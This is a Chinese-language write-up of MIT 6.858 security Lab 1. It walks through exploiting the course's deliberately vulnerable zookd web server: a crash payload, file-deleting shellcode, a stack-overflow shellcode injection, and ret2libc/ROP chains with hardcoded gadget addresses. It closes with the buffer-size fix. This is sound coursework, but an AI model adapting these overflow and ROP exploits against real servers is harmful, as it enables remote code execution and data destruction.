---
title: mit6858 Lab1 
tags: [ctf-pwn]
date: 2023-12-06 10:30:00
categories: [学习笔记]
excerpt: mit 计算机系统安全实验
---

## mit 系统安全实验Lab1

参考自[大佬的博客](https://arttnba3.cn/2022/12/25/EXPR-0X01-MIT_6_858/)🐤

地址 https://css.csail.mit.edu/6.858/2022/labs/lab1.html（Lab1用的2022年的实验）

给了一个虚拟机[ubuntu 21.10](https://web.mit.edu/6.858/2022/6.858-x86_64-v22.zip)的vmdk，安装完之后是一个tty，发现没有net-tools，也不能从虚拟机外复制进来内容，去学习了一下发现`ip addr`也可以查看ip，不过这个输出有点多，这个虚拟机终端也没法往上滚动，加了一个grep 192.168就好了。

```bash
student@6858-v22:~$ ip addr | grep 192.168
    inet 192.168.71.138/24 brd 192.168.71.255 scope global dynamic eth0
```

然后就可以ssh了

但是ubuntu21.10已经没法apt install了（

实验的内容在`git clone https://web.mit.edu/6858/2022/lab.git `



### Lab1

按照说明，首先make一下，然后运行`./clean-env.sh ./zookd 8080`

> 这里有个很玄学的问题是，我在物理机上clone下来lab，再用vscode传虚拟机，不光程序运行起来访问不到网页，make的时候也有警告。在虚拟机里clone下来的就什么问题都没有😶‍🌫️没能理解是为什么

然后可以访问到网页，是一个登陆界面

#### lab1 exercise 1 + 2

exercise1 让在`zookd.c`和`http.c`找漏洞

main函数在zookd.c中下面解释各个函数干了什么

```
main : 传入参数port 调用run_server(zookd.c)
run_server : 通过start_server(zookd.c)初始化socket，
             然后一个死循环，对每个accept fork出一个线程，执行process_client(zookd.c)
process_client : 
    1. http_request_line (http.c) : 处理请求包的第一行，即"GET /foo.html HTTP/1.0"这种
    2. http_request_headers (http.c) : 一个死循环处理从第二行开始的所有内容，存在栈溢出。
       accept来的buf[8192]进行了防溢出处理，但是value和envvar长度只有512，可以溢出
       每一对envvar和value形成了键值对，存储到了环境变量里
    3. http_serve (http.c) : 后面再说
```

exercise2 只说要让程序崩溃就行，不用劫持控制流，那直接发送一个大的包过去就完了。要求写一个`exploit-2.py`的脚本，在lab文件夹里有给好的模板`exploit-template.py`，改一下`build_exploit`就好

```python
def build_exploit(shellcode):
    req =   b"GET / HTTP/1.0\r\n" + \
            b"hack: " + b"a" * 8100 + b"\r\n"
    return req
```

观察程序报错：

```bash
student@6858-v22:~/lab$ ./clean-env.sh ./zookd 8080
exec env - PWD=/home/student/lab SHLVL=0 setarch x86_64 -R ./zookd 8080
Child process 9738 terminated incorrectly, receiving signal 11
```

执行检查：

```bash
student@6858-v22:~/lab$ make check-crash
./check-bin.sh
WARNING: bin.tar.gz might not have been built this year (2023);
WARNING: if 2023 is correct, ask course staff to rebuild bin.tar.gz.
tar xf bin.tar.gz
./check-crash.sh zookd-exstack ./exploit-2.py
10453 --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x7ffffffff000} ---
10453 +++ killed by SIGSEGV (core dumped) +++
10416 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_DUMPED, si_pid=10453, si_uid=1000, si_status=SIGSEGV, si_utime=0, si_stime=52} ---
PASS ./exploit-2.py
```

#### lab1 exercise 3

lab里给了一个shellcode.S，在make时会编译成shellcode.bin，可以用`./run-shellcode shellcode.bin`来执行这个程序。

原本是execve("/bin/sh")，exercise3 要求把它改成删除`grades.txt`。给的shellcode.S是AT&T汇编，抄的大佬的代码😭😭😭😭

```assembly
.globl main
	.type	main, @function

main:
	/* store the string on the stack */
	xorq  %rax, %rax
	pushq %rax
	movq  $0x7478742e73656461, %rax /* "ades.txt" */
	pushq %rax
	movq  $0x72672f746e656475, %rax /* "udent/gr" */
	pushq %rax
	movq  $0x74732f656d6f682f, %rax /* "/home/st" */
	pushq %rax

	/* unlink(rsp) */
	movq  %rsp, %rdi
	movq  $87, %rax /* SYS_unlink */
	syscall

	/* exit() */      不加exit会报个segmentation fault，但是也能执行
	xorq  %rdi, %rdi
	movq  $60, %rax	/* SYS_exit */
	syscall
```

#### lab1 exercise 4

exercise2 的栈溢出注入shellcode，执行的程序换了一下，换成没开NX的版本

```bash
./clean-env.sh ./zookd-exstack 8080
```

> 在url_decode函数里，当sp字符串里看到了\x00字符，就会终止向valuie里复制字符串，但是又有把%加两个digit转换为数字的case，因此payload要```.replace("\x00,%00")```再发送。

接下来就是寻找字符串的位置和返回地址的位置，虽然`value`和`envvar`看上去都可以，但是显然value更简单一点，有两种方法：

第一种：反正有源码，直接print出来

```c
printf("value addr : %p\n", &value);
void *stackAddress;
__asm__("movq %%rbp, %0" : "=r" (stackAddress));
stackAddress = (void*)((char*)stackAddress + 8);
printf("Return Address Stack Address: %p\n", stackAddress);
```

第二种：调试，gdb -p $(pgrep zookd-)`，下断点`b http.c:xxx`，查看变量地址`print &value`，拿到shellcode地址，再用rbp+8拿到返回地址（或者info frame）

payload如下：

```python
stack_buffer = 0x7fffffffda50
stack_retaddr = 0x7fffffffdc88

def build_exploit(shellcode):
    req = b"GET / HTTP/1.0\r\n"
    req += b"hack: "
    req += (
        shellcode + b"A" * ((stack_retaddr - stack_buffer) - len(shellcode)) +  p64(stack_buffer)
    ).replace(b"\x00", b'%00')
    req += b"\r\n" 
    req += b"\r\n" # 注意这里额外的一行
    return req
```

在`http_request_headers`的死循环跳出的条件是

```C
        if (buf[0] == '\0')     /* end of headers */
            break;
```

因此想要跳出循环，必须最后要有一个空行！！！！！！！😭😭😭😭😭😭😭😭😭😭😭😭

我在这卡了一下午，一直以为是我的栈地址不对😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭

再学习一下大佬的代码：

```python
shellcode = asm('nop') * 4096 + asm(shellcode_text)
payload = (p64(0x7fffffffe000) * 128 + shellcode).replace(b'\x00', b'%00')
req  = b"GET / HTTP/1.0\r\n"
req += b"arttnba3: " + payload + b"\r\n"
req += b"\r\n"
```

只要返回地址能够命中4096个nop中的任何一个，就能执行处后面的shellcode（但是这个地址又是去哪看的呢😶‍🌫️

执行检查：

```bash
student@6858-v22:~/lab$ chmod +x ./exploit-4.py 
student@6858-v22:~/lab$ make check-exstack
./check-bin.sh
WARNING: bin.tar.gz might not have been built this year (2023);
WARNING: if 2023 is correct, ask course staff to rebuild bin.tar.gz.
tar xf bin.tar.gz
./check-attack.sh zookd-exstack ./exploit-4.py
PASS ./exploit-4.py
```



#### lab1 exercise5

```bash
./clean-env.sh ./zookd-exstack 8080
```

开了nx，ret2libc。这道题要从```/proc/<pid>/maps```查看libc被加载到哪（其实都已经gdb了，直接`p 某个函数`，再减去`libc.sym['xxx']`得到的也一样

> 在gdb里也可以```shell cat /proc/<pid>/maps```

栈地址和之前是一样的，把字符串放在value上，然后在libc里找`pop rdi; ret`就行了。exp：

```python
stack_buffer = 0x7fffffffda50
stack_retaddr = 0x7fffffffdc88

def build_exploit(shellcode):
    libc_base = 0x1555552e8000
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    unlink = libc_base + libc.sym["unlink"]
    pop_rdi = libc_base + 0x2e6c5 #  pop rdi ; ret

    payload = b"/home/student/grades.txt\x00" 
    payload += b'A' * (stack_retaddr - stack_buffer - len(payload)) 
    payload += p64(pop_rdi) + p64(stack_buffer) + p64(unlink)

    req = b"GET / HTTP/1.0\r\n"
    req += b"hack: "
    payload = payload.replace(b'\x00', b'%00')
    req += payload + b"\r\n" + b"\r\n"
    return req
```

```bash
student@6858-v22:~/lab$ make check-libc
./check-bin.sh
WARNING: bin.tar.gz might not have been built this year (2023);
WARNING: if 2023 is correct, ask course staff to rebuild bin.tar.gz.
tar xf bin.tar.gz
./check-attack.sh zookd-nxstack ./exploit-5.py
PASS ./exploit-5.py
```

但是我看了一下大佬的exp，（假设未知value和retaddr），用malloc分配一段地址，靠rax加偏移量去内容的指令完成写入字符串，然后把rax放到rdi里，调用unlink。

但是在我的libc里，向chunk写入字符串倒是能找到gadget，但是没法把rax挪到rdi里。找不到以rax为src，以任何一个寄存器（非取内容）为dst的`mov`指令，也找不到形如```pop_rax_push_xxx_ret```的东西。寄了（

~~我不李姐为什么同一个vmdk创建的虚拟机libc内容不一样？真不懂😭~~

对不起，看到lab2才发现他没用给的虚拟机

虽然但是，还是摆在这学习一下吧

```python
def get_malicious_request():
    e = ELF('./zookd-nxstack')
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    libc_base = 0x1555552e8000
    
    pop_rdi_ret = libc_base + libc.search(asm('pop rdi ; ret')).__next__()
    pop_rdx_pop_rbx_ret = libc_base + 0x11f497 # 'pop rdx ; ret' by search can't be used
    pop_rcx_ret = libc_base + libc.search(asm('pop rcx ; ret')).__next__()
    ret = pop_rdi_ret + 1
    copy_gadget = libc_base + 0xc5163 # mov qword ptr [rax + rdx - 8], rdi ; ret
    push_rax_pop_rbx_ret = libc_base + 0x1750eb
    mov_rdi_rbx_call_rcx = libc_base + 0x15e9d8
   
    func_malloc = libc_base + libc.sym['malloc']
    func_unlink = libc_base + libc.sym['unlink']
    # ret for slide
    payload  = 512 * p64(ret)
    # alloc a chunk to store the string
    payload += p64(pop_rdi_ret) + p64(0x100) + p64(func_malloc)
    # copy string to chunk
    payload += p64(pop_rdx_pop_rbx_ret) + p64(0x8) + b'arttnba3'
    payload += p64(pop_rdi_ret) + p64(0x74732f656d6f682f) + p64(copy_gadget)
    payload += p64(pop_rdx_pop_rbx_ret) + p64(0x10) + b'arttnba3'
    payload += p64(pop_rdi_ret) + p64(0x72672f746e656475) + p64(copy_gadget)
    payload += p64(pop_rdx_pop_rbx_ret) + p64(0x18) + b'arttnba3'
    payload += p64(pop_rdi_ret) + p64(0x7478742e73656461) + p64(copy_gadget)
    payload += p64(pop_rdx_pop_rbx_ret) + p64(0x20) + b'arttnba3'
    payload += p64(pop_rdi_ret) + p64(0) + p64(copy_gadget)
    # call unlink(chunk)
    payload += p64(pop_rcx_ret) + p64(func_unlink)
    payload += p64(push_rax_pop_rbx_ret)
    payload += p64(mov_rdi_rbx_call_rcx)
    # url encoding
    payload = payload.replace(b'\x00', b'%00')
    req  = b"GET / HTTP/1.0\r\n"
    req += b"arttnba3: " + payload + b"\r\n"
    req += b"\r\n"
    return req
```



#### lab1 exercise6

题目让再找个漏洞，~~这显然不是我会的~~

http_serve存在文件目录穿越漏洞。

![](/img/mit6858/1.jpg)

#### lab1 exercise7

把value，envvar，reqpath数组大小全部改成8192就好了

make check-fixed之前的exp全部失效

```bash
./check-crash.sh zookd-exstack ./exploit-2.py
./check-crash.sh: line 36:  2730 Killed                  $2 $HOST $PORT > /dev/null
FAIL ./exploit-2.py
./check-attack.sh zookd-exstack ./exploit-4.py
FAIL ./exploit-4.py
./check-attack.sh zookd-nxstack ./exploit-5.py
FAIL ./exploit-5.py
rm shellcode.o
```

